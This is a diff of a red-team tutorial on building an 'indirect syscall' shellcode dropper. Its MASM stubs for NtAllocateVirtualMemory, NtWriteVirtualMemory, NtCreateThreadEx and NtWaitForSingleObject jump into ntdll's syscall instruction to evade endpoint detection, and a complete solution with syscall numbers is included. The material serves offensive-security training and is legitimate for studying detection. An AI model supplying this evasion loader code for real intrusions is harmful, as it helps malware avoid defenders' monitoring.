@@ -213,7 +213,7 @@ int main() {
 
     
 ### Header File
-Unlike the native dropper, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. 
+Like the direct syscall dropper, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. 
      
 Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtAllocateVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory). 
 
@@ -301,26 +301,36 @@ extern "C" {         // This is to ensure that the names of the functions are no
     
 
 ### Assembly Instructions
-Furthermore, we do not want to ask ntdll.dll for the syscall stub or the content or code of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we have to implement the necessary assembly code in the assembly itself. As mentioned above, instead of using a tool to create the necessary assembly instructions, for the best learning experience we will **manually implement** the **assembly code** in our direct syscall poc. To do this, you will find a file called ``syscalls.asm`` in the direct syscall dropper poc directory, which contains some of the required assembler code. The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory`` which is already implemented in the syscalls.asm file. 
+As in the direct syscall dropper, we do not want to ask ntdll.dll for the syscall stub or the content or code of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we have to implement the necessary assembly code in the assembly itself. But compared to the direct syscall dropper, in the **indirect syscall dropper** we only implement a part of the syscall stub directly. That is, we implement ``mov r10, rcx``, ``mov eax, SSN``, but we replace the ``syscall`` instruction with ``jmp qword ptr``. This allows us to jump to the memory address of the syscall instruction in the memory of ntdll.dll, and the syscall- and return-instructions are executed in the memory of ntdll.dll. 
+     
+     
+Also in this case, instead of using a tool to create the necessary assembly instructions, for the best learning experience we will **manually implement** the **assembly code** in our indirect syscall poc. To do this, you will find a file called ``syscalls.asm`` in the indirect syscall dropper poc directory, which contains some of the required assembler code. Compared to the direct syscall dropper poc, in the ``syscalls.asm`` file of the indirect syscall dropper poc, we need to be able to call the memory address of the respective syscall. This is necessary to realise the jmp in the memory of ntdll.dll. This is done with the following code for the syscall instructions of ``NtAllocateVirtualMemory``.
+     
+The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory`` which is already implemented in the syscalls.asm file. 
 
 <details>
 <summary>Code</summary>
 
 ```asm
+EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
+     
 .CODE  ; Start the code section
+
 ; Procedure for the NtAllocateVirtualMemory syscall
 NtAllocateVirtualMemory PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
     mov eax, 18h                                    ; Move the syscall number into the eax register.
-    syscall                                         ; Execute syscall.
-    ret                                             ; Return from the procedure.
-NtAllocateVirtualMemory ENDP     
-END  ; End of the module    
+    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
+NtAllocateVirtualMemory ENDP                     	; End of the procedure.     
+     
+END  ; End of the module     
+     
 ```
     
 </details>
      
-It is your task to **add** the ``syscalls.asm`` file **as a resource** (existing item) to the direct syscall dropper project and **complete** the **assembler code** or add the **syscall stub** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
+ 
+It is **your task** to **add** the ``syscalls.asm`` file **as a resource** (existing item) to the indirect syscall dropper project and **complete** the **assembler code** and ** C code** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
 
 If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
     
@@ -328,37 +338,43 @@ If you are unable to complete the assembly code at this time, you can use the as
     <summary>Solution</summary>
 
 ```asm
+EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
+EXTERN sysAddrNtWriteVirtualMemory:QWORD            ; The actual address of the NtWriteVirtualMemory syscall in ntdll.dll.
+EXTERN sysAddrNtCreateThreadEx:QWORD                ; The actual address of the NtCreateThreadEx syscall in ntdll.dll.
+EXTERN sysAddrNtWaitForSingleObject:QWORD           ; The actual address of the NtWaitForSingleObject syscall in ntdll.dll.
+
+
 .CODE  ; Start the code section
+
 ; Procedure for the NtAllocateVirtualMemory syscall
 NtAllocateVirtualMemory PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
     mov eax, 18h                                    ; Move the syscall number into the eax register.
-    syscall                                         ; Execute syscall.
-    ret                                             ; Return from the procedure.
+    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
 NtAllocateVirtualMemory ENDP                     	; End of the procedure.
+
 
 ; Similar procedures for NtWriteVirtualMemory syscalls
 NtWriteVirtualMemory PROC
     mov r10, rcx
     mov eax, 3AH
-    syscall
-    ret
+    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
 NtWriteVirtualMemory ENDP
+
 
 ; Similar procedures for NtCreateThreadEx syscalls
 NtCreateThreadEx PROC
     mov r10, rcx
     mov eax, 0C2h
-    syscall
-    ret
+    jmp QWORD PTR [sysAddrNtCreateThreadEx]
 NtCreateThreadEx ENDP
+
 
 ; Similar procedures for NtWaitForSingleObject syscalls
 NtWaitForSingleObject PROC
     mov r10, rcx
     mov eax, 4
-    syscall
-    ret
+    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
 NtWaitForSingleObject ENDP
 
 END  ; End of the module
@@ -366,7 +382,7 @@ END  ; End of the module
     
 </details>
 
-    
+     
     
 ### Microsoft Macro Assembler (MASM)
 We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to **enable support** for **Microsoft Macro Assembler (MASM)** in the Visual Studio project by enabling the option in Build Dependencies/Build Customisations.
